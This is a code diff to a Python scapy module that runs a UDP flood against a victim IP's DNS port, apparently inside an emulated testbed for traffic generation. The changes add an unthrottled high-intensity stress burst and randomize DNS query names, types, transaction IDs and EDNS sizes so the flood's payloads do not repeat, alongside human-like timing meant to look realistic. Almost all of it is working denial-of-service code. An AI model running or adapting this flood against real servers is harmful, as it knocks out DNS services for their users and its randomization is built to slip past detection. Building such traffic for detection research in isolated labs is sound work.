@@ -4,7 +4,12 @@ import signal
 import logging
 import uuid
 import threading
-import psutil
+# Optional psutil import - gracefully handle if missing
+try:
+    import psutil
+    PSUTIL_AVAILABLE = True
+except ImportError:
+    PSUTIL_AVAILABLE = False
 import random
 from scapy.all import Ether, IP, UDP, sendp, sr1, ICMP, Raw
 
@@ -63,6 +68,48 @@ def run_attack(attacker_host, victim_ip, duration):
     # except Exception as e:
     #     attack_logger.warning(f"[udp_flood] [Run ID: {run_id}] Unable to test UDP service {victim_ip}:53: {e}")
     
+    # Phase A: High-intensity stress burst (no think time) for ~30% of duration
+    stress_duration = max(1, int(duration * 0.3))
+    advanced_duration = max(1, duration - stress_duration)
+    attack_logger.info(f"[udp_flood] [Run ID: {run_id}] Stress phase: {stress_duration}s, Advanced phase: {advanced_duration}s")
+
+    stress_scapy_cmd = f"""
+import time
+import random
+from scapy.all import *
+
+def udp_stress():
+    iface = '{attacker_host.intfNames()[0]}'
+    target_ip = '{victim_ip}'
+    dport = 53
+    end_ts = time.time() + {stress_duration}
+    while time.time() < end_ts:
+        sport = random.randint(32768, 65535)
+        # Randomize DNS query to avoid repeated payloads/sizes
+        base_domains = ['example.com', 'test.org', 'demo.net', 'sample.io', 'local.lan']
+        sub = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz0123456789') for _ in range(random.randint(5,12)))
+        qname = sub + "." + random.choice(base_domains)
+        qtype = random.choice([1, 28, 15, 16])  # A, AAAA, MX, TXT
+        txid = random.randint(0, 65535)
+        pkt = Ether()/IP(dst=target_ip)/UDP(sport=sport, dport=dport)/DNS(id=txid, rd=1, qd=DNSQR(qname=qname, qtype=qtype))
+        sendp(pkt, iface=iface, verbose=0)
+
+udp_stress()
+"""
+    stress_proc = attacker_host.popen(['python3', '-c', stress_scapy_cmd])
+    try:
+        stress_proc.wait(timeout=stress_duration + 5)
+    except Exception:
+        try:
+            stress_proc.terminate()
+        except Exception:
+            pass
+    attack_logger.info(f"[udp_flood] [Run ID: {run_id}] Stress phase completed")
+
+    # Reset timer for advanced phase and adjust duration
+    start_time = time.time()
+    duration = advanced_duration
+
     # Generate session pattern for realistic attack behavior
     session_pattern = timing_engine.get_session_pattern(duration_minutes=duration/60)
     current_hour = time.localtime().tm_hour
@@ -87,22 +134,31 @@ def enhanced_udp_flood():
     
     # Human-like timing variations
     typing_intervals = [0.08, 0.12, 0.15, 0.09, 0.11, 0.13, 0.10, 0.14]
-    
-    # DNS service patterns for realistic payloads
-    dns_payloads = [
-        b'\\x12\\x34\\x01\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x07example\\x03com\\x00\\x00\\x01\\x00\\x01',
-        b'\\xab\\xcd\\x01\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x06google\\x03com\\x00\\x00\\x01\\x00\\x01',
-        b'\\xef\\x12\\x01\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x09localhost\\x00\\x00\\x01\\x00\\x01'
-    ]
+
+    # Helper to generate randomized DNS queries (varied TXID, qname, qtype)
+    def make_dns_query():
+        base_domains = ['example.com', 'test.org', 'demo.net', 'sample.io', 'local.lan', 'example.net', 'invalid']
+        # Random subdomain depth and characters
+        labels = []
+        for _ in range(random.randint(1, 3)):
+            labels.append(''.join(random.choice('abcdefghijklmnopqrstuvwxyz0123456789') for _ in range(random.randint(3,12))))
+        domain = random.choice(base_domains)
+        qname = '.'.join(labels + [domain])
+        qtype = random.choice([1, 28, 15, 16])  # A, AAAA, MX, TXT
+        txid = random.randint(0, 65535)
+        # Occasionally add EDNS0 OPT RR to vary sizes
+        if random.random() < 0.3:
+            opt = DNSRROPT(rclass=random.choice([4096, 1232, 1452]))
+            return DNS(id=txid, rd=1, qd=DNSQR(qname=qname, qtype=qtype), ar=opt)
+        return DNS(id=txid, rd=1, qd=DNSQR(qname=qname, qtype=qtype))
     
     packet_count = 0
     while True:
         try:
             # Create UDP packet with protocol compliance
             src_port = random.randint(32768, 65535)  # Ephemeral port range
-            payload = random.choice(dns_payloads)  # Realistic DNS payload
-            
-            packet = Ether()/IP(dst=target_ip)/UDP(sport=src_port, dport=target_port)/Raw(load=payload)
+            dns_layer = make_dns_query()
+            packet = Ether()/IP(dst=target_ip)/UDP(sport=src_port, dport=target_port)/dns_layer
             sendp(packet, iface=interface, verbose=0)
             
             packet_count += 1
@@ -150,7 +206,7 @@ enhanced_udp_flood()
         if current_time >= next_monitor:
             # Estimate packets sent with enhanced timing considerations
             # Base rate is lower due to human-like timing (average ~20-30 pps instead of 100)
-            base_rate = 25  # More realistic rate with enhanced timing
+            base_rate = random.uniform(20, 30)  # Randomized rate with enhanced timing (±20%)
             if current_phase:
                 adjusted_rate = base_rate * current_phase['intensity'] * circadian_factor * workday_factor
             else:
@@ -201,7 +257,7 @@ enhanced_udp_flood()
     process.wait()
     
     # Calculate enhanced final statistics
-    base_rate = 25  # Enhanced timing rate
+    base_rate = random.uniform(20, 30)  # Randomized enhanced timing rate (±20%)
     effective_rate = base_rate * circadian_factor * workday_factor
     final_packets_sent = int(actual_duration * effective_rate)
     avg_rate = final_packets_sent / actual_duration if actual_duration > 0 else 0
